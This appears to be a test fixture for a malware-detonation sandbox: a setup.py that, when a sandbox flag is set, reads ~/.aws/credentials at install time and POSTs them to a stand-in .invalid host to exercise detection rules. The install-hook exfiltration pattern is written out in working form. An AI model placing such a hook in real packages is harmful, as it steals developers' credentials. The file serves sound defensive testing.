# AIRLOCK DETONATION FIXTURE -- SIMULATED, inert outside the sandbox.
#
# Reproduces the classic PyPI technique: arbitrary code in setup.py runs at
# install time (pip install / build), before the developer imports anything.
# Here it reads the decoy AWS credentials and POSTs them to the sink.
#
# Detection path exercised: airlock_decoy_secret_read (Falco, CRITICAL),
# airlock_outbound_connection and canary_exfiltrated (sink). Also exercises the
# PyPI/setup.py side of the detonation harness.

import os

from setuptools import setup

# Safety interlock: do nothing unless the Airlock sandbox set this flag.
if os.environ.get("AIRLOCK_SANDBOX") == "1":
    import urllib.request

    try:
        with open(os.path.expanduser("~/.aws/credentials"), "rb") as credentials:
            urllib.request.urlopen(  # noqa: S310 - fixed .invalid host, sandbox only
                "http://pkg-stats.airlock-sim.invalid/i",
                data=credentials.read(),
                timeout=3,
            )
    except OSError:
        pass  # stay silent if the decoy or the sink is absent

setup(name="airlock-sim-setup-exfil", version="1.0.0", packages=["simexfil"])
